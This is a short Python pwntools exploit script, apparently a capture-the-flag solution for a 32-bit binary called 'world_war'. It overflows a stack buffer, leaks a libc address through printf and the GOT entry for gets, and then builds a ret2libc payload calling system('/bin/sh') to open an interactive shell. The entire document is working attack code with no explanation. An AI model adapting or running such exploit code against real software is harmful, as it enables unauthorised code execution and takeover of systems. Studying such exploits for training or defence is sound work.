from pwn import *

def exploit():
    binary = ELF("./world_war")
    #p = remote("127.0.0.1", 8888)
    p = process("./world_war")    

    padding = 72
    printf_plt = p32(binary.symbols["plt.printf"])
    gets_got = p32(binary.symbols["got.gets"])
    main = p32(binary.symbols["main"])
    
    payload = "A" * padding
    payload += printf_plt
    payload += main
    payload += gets_got
    
    p.sendline(payload)
    p.recvuntil("-->We've got some Allies!\n")
    
    libc = u32(p.recv(4))
    log.info("Libc leak : {}".format(hex(libc)))
    system_libc = libc - 0x23f50
    log.info("Libc system leak : {}".format(hex(system_libc)))
    bin_sh_libc = libc + 0xfa79b
    log.info("Libc /bin/sh leak : {}".format(hex(bin_sh_libc)))
    
    payload = ""
    payload += "A" * padding
    payload += p32(system_libc)
    payload += "JUNK"
    payload += p32(bin_sh_libc)
    
    p.sendline(payload)
    p.interactive()
    

if __name__ == "__main__":
    exploit()
